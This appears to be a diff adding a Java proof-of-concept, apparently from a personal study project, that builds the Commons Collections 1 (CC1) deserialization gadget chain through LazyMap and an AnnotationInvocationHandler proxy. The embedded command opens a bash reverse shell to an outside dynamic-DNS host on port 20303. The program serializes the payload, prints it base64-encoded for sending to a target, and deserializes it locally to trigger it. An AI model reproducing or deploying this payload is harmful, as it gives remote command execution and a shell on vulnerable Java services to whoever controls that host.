@@ -1,0 +1,75 @@
+package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import sun.misc.ProxyGenerator;
+
+
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.lang.annotation.Annotation;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1LazyMap {
+    public static void main(String[] args) throws Exception
+    {
+        Transformer[] transformers = new Transformer[]{
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
+            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/9731pz95hm92.vicp.fun/20303 0>&1"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap<Object, Object> map = new HashMap<>();
+        Map<Object, Object> lazyMap = LazyMap.decorate(map,chainedTransformer);
+        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor<?> annotationInvocationHandlerConstructor =annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
+        annotationInvocationHandlerConstructor.setAccessible(true);
+        InvocationHandler ProxyInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);
+        Map ProxylazyMap1 = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},ProxyInvocationHandler);
+//        ProxylazyMap.entrySet();
+//        byte[] classFile = ProxyGenerator.generateProxyClass("org.example.ProxylazyMap1_jdk8u65", ProxylazyMap1.getClass().getInterfaces());
+//        try(FileOutputStream fos = new FileOutputStream("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\ProxylazyMap1_jdk8u65.class")) {
+//            fos.write(classFile);
+//            fos.flush();
+//            System.out.println("代理类class文件写入成功");
+//        } catch (Exception e) {
+//            System.out.println("写文件错误");
+//        }
+        Object ProxylazyMap2 = annotationInvocationHandlerConstructor.newInstance(Override.class,ProxylazyMap1);
+        serialize(ProxylazyMap2);
+        System.out.println(base64encode(Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\ser.bin"))));
+        unserialize("ser.bin");
+    }
+    public static String base64encode(byte[] bytes) throws Exception
+    {
+        Class<?> base64 = Class.forName("java.util.Base64");
+        Object Encoder = base64.getMethod("getEncoder").invoke(null);
+        return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder,bytes);
+    }
+    public static void serialize(Object obj) throws Exception
+    {
+        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
+        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
+        oos.writeObject(obj);
+        oos.close();
+    }
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
+    {
+        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
+        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
+        Object obj = ois.readObject();
+        ois.close();
+        return obj;
+    }
+}
